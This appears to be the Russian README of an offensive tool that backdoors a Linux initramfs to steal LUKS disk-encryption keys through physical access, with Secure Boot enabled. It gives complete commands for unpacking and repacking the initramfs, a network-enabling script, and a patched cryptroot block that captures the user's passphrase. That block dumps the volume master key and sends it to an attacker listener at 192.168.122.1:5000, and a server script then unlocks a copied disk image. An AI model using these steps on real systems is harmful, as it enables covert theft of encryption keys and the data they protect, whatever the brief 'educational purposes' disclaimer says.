# XIntercept: взлом LUKS путём перехвата пароля
> Debian 13.4, Secure Boot **ВКЛЮЧЁН**, initramfs-tools
>> Secure Boot был создан для защиты от низкоуровневых программных руткитов. Однако во многих стандартных дистрибутивах Linux эта «безопасная загрузка» не распространяется на initramfs, что приводит к компрометации системы при наличии у злоумышленника физического доступа.

[![Russian](https://img.shields.io/badge/README-in_English-red.svg)](README.md)

> [!WARNING]
> Только в образовательных целях.

## Сборка

Требования: docker

Используйте `build.sh` для сборки статических бинарников. Они будут сохранены в `bin/`

## Использование

### Подготовка к атаке

После успешной сборки перейдите в каталог `bin/`.

Сгенерируйте пары ключей с помощью `./generate_keys`. Они будут автоматически сохранены в файл `keys.config`.

```
Открытый ключ: a79beaf765d97bcea0ff1f65ff627c6410d58febbf03e9df01c7cac258748d01
Секретный ключ: d661ce73e1f095ec01b50235d53495969df9a55750135fa2dfd1fc7bf9e2b3fd
[+] Ключи успешно записаны в keys.config
```

Открытый ключ понадобится для безопасной отправки мастер-ключа LUKS через `vxclient`.

### Внедрение в initramfs

Демонстрация проводилась (на момент написания) на последней версии Debian 13.4 с **включённым** Secure Boot. Подобная атака возможна на большинстве современных дистрибутивов Linux. Виртуальная машина: QEMU, KVM (`virt-manager`). Все описанные команды выполняются от имени root.

1. Монтирование загрузочного раздела (`/dev/vda2`)

`mount /dev/vda2 /mnt`

2. Копирование файла initramfs и подготовка рабочей папки

`cp /mnt/initrd.img-6.12.74+deb13+1-amd64 ~/`

`mkdir -p ~/extracted`

`cd ~`

`unmkinitramfs initrd.img-6.12.74+deb13+1-amd64 extracted/`

Теперь у вас будет содержимое initramfs в `extracted/`. `early` содержит обновления микрокода, `main` - сам initramfs.

3. Модификация initramfs: **включение поддержки сети**

Перейдите в initramfs:
`cd extracted/main`

Создайте `init-premount`, в котором будут храниться скрипты, выполняющиеся *после* загрузки основных модулей, но *до* монтирования корневой файловой системы.
`mkdir -p scripts/init-premount`

Вставьте следующее содержимое в файл `scripts/init-premount/ORDER`.
`vim scripts/init-premount/ORDER`
```
/scripts/init-premount/network "$@"
[ -e /conf/param.conf ] && . /conf/param.conf
```

Теперь напишем сетевой скрипт: `vim scripts/init-premount/network`
```shell
#!/bin/sh
PREREQ=""
prereqs()
{
    echo "$PREREQ"
}

case $1 in
prereqs)
    prereqs
    exit 0
    ;;
esac

# Мы ведь не хотим лишнего вывода в консоль, верно?
# Замените на нужные вам сетевые драйверы, например, `e1000`
# Здесь можно даже настроить Wi-Fi соединение
modprobe virtio_pci 2>/dev/null
modprobe virtio_net 2>/dev/null
modprobe af_packet 2>/dev/null

# Немного подождём для обнаружения устройства
sleep 1

IFACE=$(ls /sys/class/net | grep -v lo | head -1)
if [ -n "$IFACE" ]; then
    ip link set "$IFACE" up

    # Ждём появления carrier
    for i in $(seq 1 10); do
        carrier=$(cat "/sys/class/net/$IFACE/carrier" 2>/dev/null)
        [ "$carrier" = "1" ] && break
        sleep 1
    done

    # Возможно, вам потребуется изменить IP-адреса или DNS
    # DNS-резолвер не требуется, если вы используете статические IP-адреса.
    ip addr add 192.168.122.146/24 dev "$IFACE"
    ip route add default via 192.168.122.1
    echo "nameserver 192.168.122.1" > /etc/resolv.conf

fi
```

Не забудьте сделать скрипт исполняемым: `chmod +x scripts/init-premount/network`

4. Модификация initramfs: **перехват мастер-ключа**

Ранее (в LUKS1) мы могли выполнить команду `dmsetup table --showkeys <имя_тома>` и извлечь мастер-ключ; однако в LUKS2 ключи шифрования хранятся в kernel keyring.
Чтобы не усложнять задачу, мы поступим следующим образом: перехватим пароль пользователя, получим мастер-ключ с помощью встроенной утилиты `cryptsetup` и продолжим загрузку, как будто ничего не произошло. Если вы фанат реверс-инжиниринга ядра Linux и на машине *жертвы* каким-то образом включены отладочные символы, смотрите [здесь](https://drgn.readthedocs.io/en/latest/case_studies/dm_crypt_key.html).

`vim scripts/local-top/cryptroot`

Найдите эту часть скрипта:
```shell
while [ $maxtries -le 0 ] || [ $count -lt $maxtries ]; do
    if [ -z "${CRYPTTAB_OPTION_keyscript+x}" ] && [ "$CRYPTTAB_KEY" != "none" ]; then
        # unlock via keyfile
        unlock_mapping "$CRYPTTAB_KEY"
    else
        # unlock interactively or via keyscript
        run_keyscript "$count" | unlock_mapping
        # ^
        # ^
        # МЫ БУДЕМ ИЗМЕНЯТЬ ЭТУ ЧАСТЬ
    fi
    rv=$?
    count=$(( $count + 1 ))

```

Мы прочитаем пароль пользователя в переменную `_passphrase`, затем выгрузим мастер-ключ в `_master_key` и отправим его через `vxclient`. Замените IP, порт и открытый ключ на свои. После отправки мастер-ключа система продолжит обычный процесс загрузки и удалит эти переменные из памяти.

```shell
if [ -z "${CRYPTTAB_OPTION_keyscript+x}" ] && [ "$CRYPTTAB_KEY" != "none" ]; then
    # unlock via keyfile
    unlock_mapping "$CRYPTTAB_KEY"
else
    # unlock interactively or via keyscript
    # ----- НАЧАЛО ПЕРЕХВАТА -----
    _passphrase="$(run_keyscript "$count")"
    _master_key="$(printf '%s' "$_passphrase" \
        | cryptsetup luksDump -q --dump-volume-key -d - \
            "$CRYPTTAB_SOURCE" 2>/dev/null)"

    /scripts/local-top/vxclient \
        -i 192.168.122.1 -p 5000 \
        -o 63acb0238ec4df0d358a0a8a293db7ab3551455ea01a31c90d59770888f7e955 \
        -m "$_master_key" 2>/dev/null &

    printf '%s' "$_passphrase" | unlock_mapping
    unset _passphrase _master_key
    # ----- КОНЕЦ ПЕРЕХВАТА -----
    # run_keyscript "$count" | unlock_mapping <- удалите или закомментируйте эту строку
    fi
    rv=$?
    count=$(( $count + 1 ))
```

5. Сборка модифицированного initramfs

Перейдите в папку, куда вы извлекли части `early` и `main` из initramfs.
`cd ~/extracted`

Сборка стадии `early` initramfs:
`(cd early && find . -print0 | sort -z | cpio --null -o -H newc --reproducible) > early.cpio`

Сборка стадии `main` initramfs:
`(cd main && find . -print0 | sort -z | cpio --null -o -H newc --reproducible) | zstd -3 -T0 > main.cpio.zst`

Теперь нужно просто объединить эти стадии в один файл:
`cat early.cpio main.cpio.zst > initramfs_patched.img`

6. Замена оригинального initramfs на модифицированный

`cp initramfs_patched.img /mnt/initrd.img-6.12.74+deb13+1-amd64`

7. Размонтирование загрузочного раздела и копирование зашифрованного раздела LUKS.

`umount /mnt`

Я использую размер блока `64M` для лучшей производительности, но вы можете использовать любой другой. Замените `/path/to/sda3_luks_file` на путь к файлу, в котором будет храниться полная копия зашифрованного раздела LUKS.

`dd if=/dev/vda3 of=/path/to/sda3_luks_file bs=64M iflag=fullblock oflag=direct status=progress`

### Ожидание ключей

После этих шагов остаётся только дождаться, когда *жертва* введёт свой пароль при загрузке. Вы получите мастер-ключ и сможете расшифровать образ диска.

Есть два способа использования сервера: автоматический и ручной.

1. Ручное использование:
`Использование: ./vxserver -p <ПОРТ> -s <СЕКРЕТНЫЙ_КЛЮЧ_HEX> -o <ОТКРЫТЫЙ_КЛЮЧ_HEX>`
По умолчанию он выведет дамп мастер-ключа LUKS в `stdout`. Вам нужно будет самостоятельно обработать вывод, чтобы расшифровать раздел.

2. Автоматическое использование (**рекомендуется**):
Переместите (или создайте символическую ссылку) `execute.py` в каталог `bin/`.
```
usage: execute.py [-h] -d DEVICE [-p PORT] [-k KEYS] [-n NAME] [-i INPUT]

обёртка для vxserver для автоматической разблокировки томов LUKS с помощью перехваченного мастер-ключа

опции:
  -h, --help           показать это справочное сообщение и выйти
  -d, --device DEVICE  блочное устройство (или файл) для разблокировки (/dev/vda3)
  -p, --port PORT      порт для прослушивания
  -k, --keys KEYS      путь к файлу с парой ключей
  -n, --name NAME      имя для разблокированного устройства (mapper device)
  -i, --input INPUT    не запускать vxserver; обработать текстовый файл и разблокировать раздел

```

Пример использования: `python execute.py -d sda3_file -p 5000 -k keys.config -n sda3_crypt`

Python-скрипт прочитает пару ключей из `keys.config` и будет слушать порт `5000`. Когда он получит зашифрованное сообщение от `vxclient`, он автоматически расшифрует его, обработает и разблокирует LUKS-раздел из файла `sda3_file`. Разблокированный раздел будет доступен по пути `/dev/mapper/sda3_crypt`.

На всякий случай, сразу после получения дампа скрипт автоматически сохраняет его в файл `mk_dump_{имя_mapper}_{имя_файла}_{случайные_8_байт_в_hex}`. Если что-то пойдёт не так во время автоматической расшифровки или обработки, вы всегда можете попытаться расшифровать его самостоятельно. Или использовать опцию `--input`, которая обработает файл и попытается расшифровать без запуска сервера.

### Пример успешного выполнения
```
[root@secux-thinkbook bin]# python execute.py -d sda3
[+] Saved captured dump to mk_dump_decrypted_luks_sda3_4a5a030fc8fc2b46
[*] Drive: /dev/vda3
[*] Cipher name: aes
[*] Cipher mode: xts-plain64
[*] Payload offset: 32768
[*] UUID: 8eea5e55-081d-43fe-8d41-b6a637ac7a6b
[*] Master key bits: 512
[+] Master key length: 64 bytes
[+] Master key (hex): 2d41a3eb7924642c07dbb5ff77ab3e877d5782ca5e5ae480fae491b8d6dded998ee3e4d0d8aa072b8d0a195a13da46f4fda3774492b7fb7b71b9eaed95589991
[+] LUKS volume successfully unlocked as decrypted_luks!
```

**Вы ведь не будете использовать это во вред, правда?**